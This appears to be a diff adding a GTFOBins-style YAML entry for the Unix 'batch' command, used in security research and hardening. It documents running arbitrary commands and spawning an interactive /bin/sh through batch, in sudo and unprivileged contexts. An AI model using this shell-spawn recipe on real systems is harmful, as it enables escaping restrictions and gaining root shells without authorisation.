@@ -1,0 +1,20 @@
+---
+functions:
+  command:
+  - blind: true
+    code: |-
+      echo /path/to/command | batch
+    comment: |-
+      The command is executed when the system load average drops below 1.5 (or the value specified by [atd](../atd)).
+    contexts:
+      sudo:
+      unprivileged:
+  shell:
+  - code: |-
+      echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | batch; tail -f /dev/null
+    comment: |-
+      `tail` is used to pause the terminal. The shell starts when the system load average drops below 1.5.
+    contexts:
+      sudo:
+      unprivileged:
+...
